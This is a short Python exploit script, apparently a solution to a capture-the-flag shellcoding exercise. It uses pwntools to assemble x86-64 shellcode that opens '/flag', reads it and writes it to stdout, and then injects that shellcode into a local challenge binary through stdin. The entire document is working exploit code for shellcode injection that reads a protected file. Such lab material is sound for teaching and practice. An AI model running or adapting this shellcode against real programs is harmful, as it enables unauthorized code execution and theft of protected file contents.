from pwn import *

context.update(arch="x86-64", encoding="latin")

p = process("/challenge/babyshell_level4")

shellcode = f'''
.global _start
_start:
.intel_syntax noprefix
	mov r10d, 0x67616c66
	shl r10, 8
	mov r10b, 0x2f
	push r10
        push rsp
        pop rdi

        xor esi, esi
        xor edx, edx
        mov al, 2
        syscall

        mov edi, eax
        push rsp
        pop rsi
        mov dl, 64
        xor eax, eax
        syscall

        mov dil, 1
        push rsp
        pop rsi
        mov al, 1
        syscall

        mov al, 60
        xor edx, edx
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x1000 bytes from stdin.")
p.write(shellcode)
print(p.readall())
print(shellcode.hex())
